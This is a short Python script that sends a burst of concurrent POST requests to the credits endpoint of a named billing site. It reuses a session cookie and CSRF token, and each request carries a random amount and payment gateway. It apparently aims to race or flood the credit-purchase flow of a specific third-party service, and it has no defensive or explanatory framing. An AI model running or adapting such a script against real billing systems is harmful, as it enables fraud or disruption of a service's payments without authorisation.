import requests
import random
import concurrent.futures

url = "https://billing.embernodes.com/credits"

paymenter_token = "ABC123"
paymenter_session = "123ABC"

cookies = {
    "paymenter_session": paymenter_session
}

def send_request():
    data = {
        "_token": paymenter_token,
        "amount": random.randint(80, 100),
        "gateway": random.choice([11, 15])
    }
    response = requests.post(url, data=data, cookies=cookies)
    return response.status_code, response.text

def send_requests_multithreaded(num_requests):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(send_request) for _ in range(num_requests)]
        for future in concurrent.futures.as_completed(futures):
            try:
                status_code, response_text = future.result()
                print(f"Status Code: {status_code}, Response: {response_text}")
            except Exception as e:
                print(f"Request failed: {e}")

send_requests_multithreaded(10)
